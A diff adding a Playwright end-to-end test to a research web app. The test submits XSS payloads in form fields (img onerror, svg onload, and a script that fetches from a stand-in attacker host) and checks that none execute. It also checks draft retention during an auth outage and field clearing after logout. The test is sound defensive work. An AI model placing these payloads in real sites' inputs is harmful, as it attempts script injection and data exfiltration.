@@ -2265,6 +2265,98 @@ def test_new_research_without_task_selector_keeps_real_create_and_save(tmp_path)
 
 
 
+def test_current_main_private_problem_xss_auth503_draft_and_real401_clear(tmp_path):
+    import asyncio
+    import importlib.util
+    from urllib.parse import urlsplit
+    from playwright.async_api import expect as actual_expect
+    spec=importlib.util.spec_from_file_location('accepted_current_privacy_fin1',ROOT/'web/tests/e2e/test_research_financial_preview_browser.py')
+    fin1=importlib.util.module_from_spec(spec);spec.loader.exec_module(fin1)
+    async def journey():
+        async with fin1.actual_browser(tmp_path) as (page,service,bridge,facts):
+            facts['scope']='actual Main15 private problem text, auth-read503 draft retention and real logout401 clear'
+            base=service.origin;auth_url=base+'/api/auth/me';attack_host='privacy-attack.example.invalid'
+            attacks=[];writes=[];reads=[]
+            def requested(request):
+                if urlsplit(request.url).hostname==attack_host:attacks.append(True)
+                if request.method=='POST' and (request.url==base+'/api/research' or request.url.endswith('/revisions')):writes.append(True)
+                if request.method=='GET' and request.url.startswith(base+'/api/research'):reads.append(True)
+            page.on('request',requested)
+            await page.goto(base+'/research')
+            await actual_expect(page.locator('#research-list-status')).to_contain_text('已读取 1 条研究')
+            problem='真实私有问题：<img src="https://'+attack_host+'/problem" onerror="window.__currentResearchPrivacyInjected=true">'
+            summary='私有摘要：</textarea><svg onload="window.__currentResearchPrivacyInjected=true"></svg><script>window.__currentResearchPrivacyInjected=true;fetch("https://'+attack_host+'/summary")</script>'
+            await page.locator('#original-input').fill(problem)
+            await page.locator('#objective').fill('验证私有文本不会变成可执行页面内容')
+            await page.locator('#summary').fill(summary)
+            await page.locator('#constraints').fill('仅本任务合成问题，不执行研究或外发')
+            await page.locator('#confirmed').check()
+            async with bridge.capture_response(page,'POST',base+'/api/research') as captured:
+                async with page.expect_response(lambda response:response.url==base+'/api/research' and response.request.method=='POST') as saved:
+                    await page.locator('#save').click()
+                response=await saved.value;assert response.status==200
+                data=(await captured.json(response))['data']
+            rid=data['research']['id']
+            assert rid!=service.seed.research_id
+            assert data['current_problem']['original_input']==problem and data['current_problem']['summary']==summary
+            await actual_expect(page.locator('#status')).to_contain_text('已保存修订 1')
+            actual=await fin1.helpers._native_tls_fetch(page,'/api/research/'+rid)
+            assert actual['status']==200
+            assert actual['body']['data']['current_problem']['original_input']==problem
+            assert actual['body']['data']['current_problem']['summary']==summary
+            await actual_expect(page.locator('#history-items img,#history-items svg,#history-items script,#history-items iframe')).to_have_count(0)
+            await actual_expect(page.locator('[onerror*="__currentResearchPrivacyInjected"],[onload*="__currentResearchPrivacyInjected"]')).to_have_count(0)
+            assert await page.locator('script').evaluate_all('nodes=>nodes.every(node=>!node.textContent.includes("__currentResearchPrivacyInjected"))')
+            assert await page.evaluate('window.__currentResearchPrivacyInjected===undefined') and attacks==[]
+            await page.goto(base+'/research/'+rid)
+            await actual_expect(page.locator('#status')).to_contain_text('已从账户读取')
+            await actual_expect(page.locator('#original-input')).to_have_value(problem)
+            await actual_expect(page.locator('#summary')).to_have_value(summary)
+            await actual_expect(page.locator('#research-list-status')).to_contain_text('已读取 2 条研究')
+            history=await page.locator('#history-items').text_content()
+            assert problem in history and summary in history
+            await actual_expect(page.locator('#history-items img,#history-items svg,#history-items script,#history-items iframe')).to_have_count(0)
+            await actual_expect(page.locator('[onerror*="__currentResearchPrivacyInjected"],[onload*="__currentResearchPrivacyInjected"]')).to_have_count(0)
+            assert await page.locator('script').evaluate_all('nodes=>nodes.every(node=>!node.textContent.includes("__currentResearchPrivacyInjected"))')
+            assert await page.evaluate('window.__currentResearchPrivacyInjected===undefined') and attacks==[]
+            draft='尚未保存的私有问题草稿，认证暂不可用不代表登出。'
+            draft_summary='尚未保存的私有摘要，必须等待真实账户状态。'
+            await page.locator('#original-input').fill(draft)
+            await page.locator('#summary').fill(draft_summary)
+            pending=await page.evaluate('Object.keys(sessionStorage).filter(key=>key.startsWith("structure-research-pending:")).length')
+            assert pending==0 and len(writes)==1
+            read_before_fault=len(reads)
+            faults=[]
+            async def auth_unavailable(route):
+                assert route.request.method=='GET' and route.request.url==auth_url
+                faults.append(route.request)
+                await route.fulfill(status=503,content_type='application/json',headers={'Cache-Control':'no-store'},body='{"error":"TEST_AUTH_UNAVAILABLE"}')
+            await page.route(auth_url,auth_unavailable,times=1)
+            async with page.expect_response(lambda response:response.url==auth_url and response.request.method=='GET' and response.status==503) as unavailable:
+                await page.locator('#research-list-refresh').click()
+            response=await unavailable.value
+            assert len(faults)==1 and response.request is faults[0]
+            await actual_expect(page.locator('#status')).to_contain_text('账户状态暂时无法核对')
+            await actual_expect(page.locator('#original-input')).to_have_value(draft)
+            await actual_expect(page.locator('#summary')).to_have_value(draft_summary)
+            await actual_expect(page.locator('#problem-form')).to_be_visible()
+            assert len(writes)==1 and len(reads)==read_before_fault
+            assert await page.evaluate('Object.keys(sessionStorage).filter(key=>key.startsWith("structure-research-pending:")).length')==pending
+            await page.unroute(auth_url,auth_unavailable)
+            logged_out=await fin1.helpers._native_tls_fetch(page,'/api/auth/logout','POST',{})
+            assert logged_out['status']==200
+            async with page.expect_response(lambda response:response.url==auth_url and response.request.method=='GET' and response.status==401) as rejected:
+                await page.locator('#research-list-refresh').click()
+            assert (await rejected.value).status==401
+            await actual_expect(page.locator('#problem-form')).to_be_hidden()
+            await actual_expect(page.locator('#original-input')).to_have_value('')
+            await actual_expect(page.locator('#summary')).to_have_value('')
+            await actual_expect(page.locator('#history-items')).to_be_empty()
+            assert await page.evaluate('window.__currentResearchPrivacyInjected===undefined') and attacks==[] and len(writes)==1
+            facts.update({'problem_summary_saved_readback_reopened':True,'injected_nodes':0,'attack_request_attempts':len(attacks),'auth_read503_fault_count':len(faults),'unsaved_problem_summary_retained':True,'no_unknown_save_masked':True,'real_logout200_auth401_private_fields_cleared':True})
+    asyncio.run(journey())
+
+
 def _open_formula_editor(page,base,*,left='little',right='little',scope='expression'):
     page.goto(base+'/research')
     expect(page.locator('#problem-form')).to_be_visible()
